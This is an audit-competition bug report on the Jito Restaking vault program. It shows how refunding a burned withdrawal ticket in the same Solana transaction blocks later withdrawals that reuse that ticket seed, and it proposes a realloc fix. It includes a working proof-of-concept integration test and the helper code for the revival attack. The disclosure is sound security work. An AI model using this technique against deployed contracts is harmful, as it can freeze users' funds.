# #37079 \[SC-Insight] Withdrawals can be DOSed by reviving tickets in the same burn tx

**Submitted on Nov 24th 2024 at 23:54:29 UTC by @NinetyNineCrits for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

* **Report ID:** #37079
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/jito-foundation/restaking/tree/master/vault\\_program>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

When a withdrawal ticket gets closed, its data gets zeroed out but not resized to zero. When someone refunds the ticket account in the same transaction to prevent the account to be garbage collected, then trying to enqueue a new withdrawal for the same account will fail, because the acount is asserted to be empty. This will cause funds to be locked for third party programs building on top of the Jito vault-program.

## Vulnerability Details

The `process_burn_withdrawal_ticket` calls the `close_program_account` function like this:

```rs
close_program_account(program_id, vault_staker_withdrawal_ticket_info, staker)?;
```

This will transfer out all the lamports from the ticket account, assign its owner to the system program and zero out the data on the account:

```rs
    **destination_account.lamports.borrow_mut() = destination_account
        .lamports()
        .checked_add(account_to_close.lamports())
        .ok_or(ProgramError::ArithmeticOverflow)?;
    **account_to_close.lamports.borrow_mut() = 0;

    account_to_close.assign(&solana_program::system_program::id());
    let mut account_data = account_to_close.data.borrow_mut();
    let data_len = account_data.len();
    solana_program::program_memory::sol_memset(*account_data, 0, data_len);
```

If an account has zero lamports at the end of a tx, then the system will garbage collect it and remove all the data. If a subsequent instruction in the same tx transfers enough lamports back in, then the garbage collection will not happen. This is commonly known as a revival attack.

When a withdrawal gets enqueued in `process_enqueue_withdrawal` and a corresponding ticket needs to be created the `load_system_account` function will perform some checks on the ticket account prior to creation. Notably, it checks that the account has no data:

```rs
if !info.data_is_empty() {
    msg!("Account data is not empty");
    return Err(ProgramError::AccountAlreadyInitialized);
}
```

If the `base` seed used for the ticket creation is the same as a previously burned ticket that has been revived, the ticket account has not been garbage collected. The account will contain data (filled with zeroes) and the returned Err will cause `process_enqueue_withdrawal` to fail.

## Impact Details

No withdrawals can be done for a `base` (seed of a withdrawal ticket) that has been previously used for a ticket that has been burned and revived. For cases, where there is no `mint_burn_admin`, this will only be an inconvenience, that is solvable on the client side by switching the `base` with a new keypair. But if the `mint_burn_admin` is a third party program that was built on top of Jito, then this will cause withdrawals to fail if `base` is a PDA that is reused, for which there can be various plausible scenarios:

* The third-party program buffers withdrawals and then performs them in bulk reusing the same PDA to sign for `base`
* Users can withdraw individually and for each user there will be a PDA created using only the users pubkey

The impact is ultimately frozen funds, that can not be withdrawn.

## Recommendation and addressing scope

It can be argued that the underlying issue is that the function `close_program_account`, which is technically not listed as in scope, is at fault for setting all bytes to 0 instead of resizing the data to zero.

But just to showcase a simple fix on the in-scope code, a solution is to resize the data to zero before invoking `close_program_account` in `process_burn_withdrawal_ticket` (tested with the POC):

```rs
vault_staker_withdrawal_ticket_info.realloc(0, false)?;
close_program_account(program_id, vault_staker_withdrawal_ticket_info, staker)?;
```

## References

not applicable

## Proof of Concept

## POC

The following helper function needs to be added to `fixtures/vault_client.rs` within the `VaultProgramClient` impl:

```rs
    pub async fn do_99crits_burn_withdrawal_ticket_with_refund(
        &mut self,
        vault_root: &VaultRoot,
        staker: &Keypair,
        vault_staker_withdrawal_ticket_base: &Pubkey,
        program_fee_wallet: &Pubkey,
    ) -> Result<(), TestError> {
        let vault = self.get_vault(&vault_root.vault_pubkey).await.unwrap();
        let vault_staker_withdrawal_ticket = VaultStakerWithdrawalTicket::find_program_address(
            &jito_vault_program::id(),
            &vault_root.vault_pubkey,
            vault_staker_withdrawal_ticket_base,
        )
        .0;

        let blockhash = self.banks_client.get_latest_blockhash().await?;
        self._process_transaction(&Transaction::new_signed_with_payer(
            &[jito_vault_sdk::sdk::burn_withdrawal_ticket(
                &jito_vault_program::id(),
                &Config::find_program_address(&jito_vault_program::id()).0,
                &vault_root.vault_pubkey,
                &get_associated_token_address(&vault_root.vault_pubkey, &vault.supported_mint),
                &vault.vrt_mint,
                &staker.pubkey(),
                &get_associated_token_address(&staker.pubkey(), &vault.supported_mint),
                &vault_staker_withdrawal_ticket,
                &get_associated_token_address(&vault_staker_withdrawal_ticket, &vault.vrt_mint),
                &get_associated_token_address(&vault.fee_wallet, &vault.vrt_mint),
                &get_associated_token_address(program_fee_wallet, &vault.vrt_mint),
            ),
            transfer(&self.payer.pubkey(), &vault_staker_withdrawal_ticket, 100_000_000),
            ],
            Some(&self.payer.pubkey()),
            &[&self.payer],
            blockhash,
        ))
        .await?;

        Ok(())
    }
```

This function works mostly like `do_burn_withdrawal_ticket` (same file), except that it adds a transfer to the instruction list.

Now add the following test to `integration_tests/tests/vault/burn_withdrawal_ticket.rs` and run it with `SBF_OUT_DIR=$(pwd)/target/sbf-solana-solana/release cargo nextest run --all-features --no-capture test_99crits_prevent`:

```rs
    //@note many parts copied from test_burn_withdrawal_ticket_basic_success
    #[tokio::test]
    async fn test_99crits_prevent_reopening_grief() {
        const MINT_AMOUNT: u64 = 100_000;
        const WITHDRAWAL_AMOUNT: u64 = 10_000;

        let deposit_fee_bps = 0;
        let withdraw_fee_bps = 0;
        let reward_fee_bps = 0;
        let num_operators = 1;
        let slasher_amounts = vec![];

        let mut fixture = TestBuilder::new().await;
        let ConfiguredVault {
            mut vault_program_client,
            restaking_program_client: _,
            vault_config_admin: _,
            vault_root,
            restaking_config_admin: _,
            operator_roots,
        } = fixture
            .setup_vault_with_ncn_and_operators(
                deposit_fee_bps,
                withdraw_fee_bps,
                reward_fee_bps,
                num_operators,
                &slasher_amounts,
            )
            .await
            .unwrap();

        let withdrawal_ticket_base = Keypair::new();

        // Initial deposit + mint
        let depositor = Keypair::new();
        vault_program_client
            .configure_depositor(&vault_root, &depositor.pubkey(), MINT_AMOUNT)
            .await
            .unwrap();
        vault_program_client
            .do_mint_to(&vault_root, &depositor, MINT_AMOUNT, MINT_AMOUNT)
            .await
            .unwrap();

        let config = vault_program_client
            .get_config(&Config::find_program_address(&jito_vault_program::id()).0)
            .await
            .unwrap();

        // Delegate all funds to the operator
        vault_program_client
            .do_add_delegation(&vault_root, &operator_roots[0].operator_pubkey, MINT_AMOUNT)
            .await
            .unwrap();

        // ------ copy from do_enqueue_withdrawal, but with fixed base ------

        let vault = vault_program_client.get_vault(&vault_root.vault_pubkey).await.unwrap();
        let depositor_vrt_token_account =
            get_associated_token_address(&depositor.pubkey(), &vault.vrt_mint);

        let vault_staker_withdrawal_ticket = VaultStakerWithdrawalTicket::find_program_address(
            &jito_vault_program::id(),
            &vault_root.vault_pubkey,
            &withdrawal_ticket_base.pubkey(),
        )
        .0;
    
        let vault_staker_withdrawal_ticket_token_account =
            get_associated_token_address(&vault_staker_withdrawal_ticket, &vault.vrt_mint);

        vault_program_client.create_ata(&vault.vrt_mint, &vault_staker_withdrawal_ticket)
            .await.unwrap();

        vault_program_client.enqueue_withdrawal(
            &Config::find_program_address(&jito_vault_program::id()).0,
            &vault_root.vault_pubkey,
            &vault_staker_withdrawal_ticket,
            &vault_staker_withdrawal_ticket_token_account,
            &depositor,
            &depositor_vrt_token_account,
            &withdrawal_ticket_base,
            WITHDRAWAL_AMOUNT,
        )
        .await.unwrap();

        vault_program_client
            .do_cooldown_delegation(&vault_root, &operator_roots[0].operator_pubkey, WITHDRAWAL_AMOUNT)
            .await
            .unwrap();

        fixture
            .warp_slot_incremental(config.epoch_length())
            .await
            .unwrap();
        vault_program_client
            .do_full_vault_update(
                &vault_root.vault_pubkey,
                &[operator_roots[0].operator_pubkey],
            )
            .await
            .unwrap();
        fixture
            .warp_slot_incremental(config.epoch_length())
            .await
            .unwrap();
        vault_program_client
            .do_full_vault_update(
                &vault_root.vault_pubkey,
                &[operator_roots[0].operator_pubkey],
            )
            .await
            .unwrap();

        // ------ modified do_burn_withdrawal_ticket ------

        vault_program_client
            .do_99crits_burn_withdrawal_ticket_with_refund(&vault_root, &depositor, &withdrawal_ticket_base.pubkey(), &config.program_fee_wallet)
            .await
            .unwrap();

        //@note this is the original call used in test_burn_withdrawal_ticket_basic_success, if you use this, re-enqueuing (below) will work
            // this shows that refunding the ticket is indeed the cause of the griefing attack
        // vault_program_client
        //     .do_burn_withdrawal_ticket(&vault_root, &depositor, &withdrawal_ticket_base.pubkey(), &config.program_fee_wallet)
        //     .await
        //     .unwrap();

        let vault = vault_program_client
            .get_vault(&vault_root.vault_pubkey)
            .await
            .unwrap();
        assert_eq!(vault.tokens_deposited(), 90000); //@note changed from original, since we dont withdraw all
        assert_eq!(vault.vrt_supply(), 90000); //@note changed from original, since we dont withdraw all
        // assert_eq!(vault.delegation_state, DelegationState::default()); //@note commented out, since we dont withdraw all
        assert_eq!(vault.vrt_enqueued_for_cooldown_amount(), 0);
        assert_eq!(vault.vrt_ready_to_claim_amount(), 0);
        assert_eq!(vault.vrt_cooling_down_amount(), 0);

        let depositor_token_account = fixture
            .get_token_account(&get_associated_token_address(
                &depositor.pubkey(),
                &vault.supported_mint,
            ))
            .await
            .unwrap();
        assert_eq!(depositor_token_account.amount, WITHDRAWAL_AMOUNT);

        // ------ try to enqueue again with the same base------
        let vault = vault_program_client.get_vault(&vault_root.vault_pubkey).await.unwrap();
        let depositor_vrt_token_account =
            get_associated_token_address(&depositor.pubkey(), &vault.vrt_mint);

        let vault_staker_withdrawal_ticket = VaultStakerWithdrawalTicket::find_program_address(
            &jito_vault_program::id(),
            &vault_root.vault_pubkey,
            &withdrawal_ticket_base.pubkey(),
        )
        .0;

        let vault_staker_withdrawal_ticket_token_account =
            get_associated_token_address(&vault_staker_withdrawal_ticket, &vault.vrt_mint);

        vault_program_client.create_ata(&vault.vrt_mint, &vault_staker_withdrawal_ticket)
            .await.unwrap();

        vault_program_client.enqueue_withdrawal(
            &Config::find_program_address(&jito_vault_program::id()).0,
            &vault_root.vault_pubkey,
            &vault_staker_withdrawal_ticket,
            &vault_staker_withdrawal_ticket_token_account,
            &depositor,
            &depositor_vrt_token_account,
            &withdrawal_ticket_base,
            WITHDRAWAL_AMOUNT,
        )
        .await.unwrap();

    }
```

This will log:

```
thread 'vault::burn_withdrawal_ticket::tests::test_99crits_prevent_reopening_grief' panicked at integration_tests/tests/vault/burn_withdrawal_ticket.rs:491:16:
called `Result::unwrap()` on an `Err` value: BanksClientError(SimulationError { err: InstructionError(0, AccountAlreadyInitialized), logs: ["Program Vau1t6sLNxnzB7ZDsef8TLbPLfyZMYXH8WTNqUdm9g8 invoke [1]", "Program log: Instruction: EnqueueWithdrawal", "Program log: Account data is not empty", 
```

Which is caused by `load_system_account` snippet mentioned in the issue description.
